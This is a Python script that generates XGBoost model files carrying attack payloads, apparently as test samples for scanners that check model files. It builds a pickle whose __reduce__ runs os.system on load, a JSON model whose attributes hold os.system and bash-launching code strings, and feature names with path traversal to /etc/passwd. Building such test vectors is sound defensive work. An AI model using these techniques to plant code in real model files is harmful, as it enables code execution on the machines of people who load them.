"""
XGBoost Attack Vector Generator

Generates real XGBoost model files (.json, .bst, .pkl) with attack payloads.
All methods produce genuine, loadable files — no JSON stubs.

Requires: xgboost, numpy, scikit-learn (pip install xgboost numpy scikit-learn)
"""

import pickle
from pathlib import Path
from typing import Dict, List, Tuple

import numpy as np
import xgboost as xgb


def _minimal_model() -> xgb.Booster:
    """Train and return a minimal XGBoost model on synthetic data."""
    rng = np.random.default_rng(42)
    X = rng.random((200, 5)).astype(np.float32)
    y = (X[:, 0] > 0.5).astype(np.float32)
    dtrain = xgb.DMatrix(X, label=y)
    params = {"max_depth": 2, "objective": "binary:logistic", "verbosity": 0}
    return xgb.train(params, dtrain, num_boost_round=3)


class XGBoostAttackGenerator:
    """Generate XGBoost-specific attack vectors."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "xgboost_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    def generate_custom_objective_rce(self) -> Tuple[str, int]:
        """Generate a real XGBoost JSON model with malicious metadata.

        Attack Vector:
            A valid XGBoost model saved as .json with the learner.attributes
            field containing Python code strings. Downstream code that
            eval()s attributes or logs them unsanitised is exploited.

        Severity: CRITICAL
        Detection: Attribute content scanning
        """
        filepath = self.output_dir / "01_custom_objective_rce.json"

        model = _minimal_model()
        # Inject malicious strings into model attributes
        model.set_attr(
            malicious_objective="__import__('os').system('id')",
            custom_callback="__import__('subprocess').call(['bash'])",
        )
        model.save_model(str(filepath))

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    def generate_embedded_pickle_in_binary(self) -> Tuple[str, int]:
        """Generate a pickled XGBoost model with RCE __reduce__.

        Attack Vector:
            A Python class whose __reduce__ returns (os.system, ('id',))
            serialised alongside a real XGBoost Booster via pickle.
            Loading triggers code execution.

        Severity: CRITICAL
        Detection: Pickle opcode analysis, REDUCE opcode detection
        """
        filepath = self.output_dir / "02_embedded_pickle.pkl"

        class MaliciousXGBWrapper:
            def __reduce__(self):
                import os
                return (os.system, ("id",))

        model = _minimal_model()
        payload = {"model": model, "hook": MaliciousXGBWrapper()}
        with open(filepath, "wb") as f:
            pickle.dump(payload, f, protocol=2)

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_feature_map_traversal(self) -> Tuple[str, int]:
        """Generate a real XGBoost JSON model with traversal paths as feature names.

        Attack Vector:
            Feature names set to "../../etc/passwd" etc.
            Parsers that use feature names as filesystem paths are exploited.

        Severity: HIGH
        Detection: Path validation in feature name handling
        """
        filepath = self.output_dir / "03_feature_map_traversal.json"

        rng = np.random.default_rng(0)
        X = rng.random((100, 3)).astype(np.float32)
        y = (X[:, 0] > 0.5).astype(np.float32)
        feature_names = [
            "feat_0",
            "../../../../../../etc/passwd",
            "../../../root/.bashrc",
        ]
        dtrain = xgb.DMatrix(X, label=y, feature_names=feature_names)
        params = {"max_depth": 2, "objective": "binary:logistic", "verbosity": 0}
        model = xgb.train(params, dtrain, num_boost_round=3)
        model.save_model(str(filepath))

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        return {
            "custom_objective": self.generate_custom_objective_rce(),
            "embedded_pickle": self.generate_embedded_pickle_in_binary(),
            "feature_map_traversal": self.generate_feature_map_traversal(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = XGBoostAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
